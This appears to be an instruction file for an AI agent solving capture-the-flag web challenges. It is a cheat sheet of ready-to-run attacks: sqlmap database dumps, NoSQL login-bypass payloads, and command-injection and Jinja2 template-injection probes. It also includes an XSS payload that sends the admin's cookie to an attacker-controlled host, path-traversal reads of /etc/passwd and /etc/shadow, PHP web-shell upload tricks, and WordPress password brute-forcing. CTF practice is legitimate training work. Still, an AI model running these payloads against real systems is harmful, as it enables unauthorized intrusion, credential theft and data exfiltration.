# Web Exploitation

Covers HTTP-based challenges: injection, auth bypass, file upload, and admin-panel access.

## Triggers

URL or web app in scope; HTTP service on a port; login form or cookie/JWT in play; `?id=` or similar query parameters; an admin panel; a CMS (WordPress, Drupal, etc.).

## Workflow

1. Enumerate directories, endpoints, and tech stack.
2. Identify the stack (language, framework, CMS, server headers).
3. Test each applicable injection class in order: SQLi, NoSQLi, SSTI, command injection, XSS, directory traversal, file upload.
4. Exploit the confirmed vulnerability.
5. Loot the flag from the filesystem, database, or admin area.

## Commands

Run these via the kali skill (it owns host/auth):

**Recon / directory enumeration**
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h <url>
curl -s <url>/robots.txt
curl -s <url>/sitemap.xml
curl -sI <url>   # inspect response headers
```

**SQL injection**
```bash
sqlmap -u "<url>?id=1" --batch --dbs
sqlmap -u "<url>?id=1" --batch -D <db> --dump
```

**NoSQL injection**

Auth bypass with operators in JSON body or query string:
```bash
# JSON body
curl -X POST <url>/login -H 'Content-Type: application/json' \
  -d '{"user":{"$ne":""},"pass":{"$ne":""}}'
# Query string variant
curl "<url>/login?user[$ne]=&pass[$ne]="
```

**Cross-site scripting (XSS)**
```bash
# Reflected / stored — usually to steal an admin cookie in CTF
<script>document.location='http://<lhost>:<port>/?c='+document.cookie</script>
```

**Command injection**
```bash
# Try in URL params or form fields
; id
| id
$(id)
`id`
```

**Server-side template injection (SSTI)**
```bash
# Probe
{{7*7}}
${7*7}
# Jinja2 escalation
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**Directory traversal**
```bash
curl "<url>?file=../../../../etc/passwd"
curl "<url>?page=../../../etc/shadow"
```

**File upload bypass**
```bash
# Double extension
shell.php.jpg
# Change Content-Type; rename to .phtml or .phar
# Add valid magic bytes to a PHP shell, then browse to the upload path
curl <url>/uploads/shell.php
```

**WordPress**
```bash
wpscan --url <url> --enumerate u,vp
wpscan --url <url> -U admin --passwords /usr/share/wordlists/rockyou.txt
```

## Pitfalls

- Missing trailing slash breaks gobuster output — add `-f` if needed.
- WAFs and rate limits may require slowing requests or rotating user-agents.
- Flag may be in the database, not on disk — dump both.
- `HttpOnly` cookies cannot be stolen via XSS; look for another vector.
- Client-side checks are trivially bypassed — read the JavaScript source.

## Flag extraction

```bash
# In sqlmap dumps
grep -rE 'flag\{|CTF\{' ~/.sqlmap/
# On the remote filesystem after RCE
cat /flag
cat /flag.txt
# Environment variables
env | grep -i flag
```

Check the admin dashboard for a displayed flag after successful login bypass.
